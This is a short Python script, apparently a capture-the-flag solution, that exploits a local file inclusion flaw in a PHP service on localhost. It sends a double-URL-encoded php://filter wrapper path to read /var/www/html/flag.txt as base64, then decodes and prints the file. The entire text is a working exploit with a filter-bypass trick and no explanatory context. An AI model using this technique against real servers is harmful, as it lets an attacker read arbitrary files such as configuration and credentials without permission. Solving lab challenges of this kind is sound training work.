import requests
import base64

r = requests.get(
    "http://127.0.0.1:50000/php%253A%252F%252Ffilter%252Fread%253Dconvert%252Ebase64%252Dencode%252Fresource%253D%252Fvar%252Fwww%252Fhtml%252Fflag%252Etxt"
)

print(base64.b64decode(r.content))
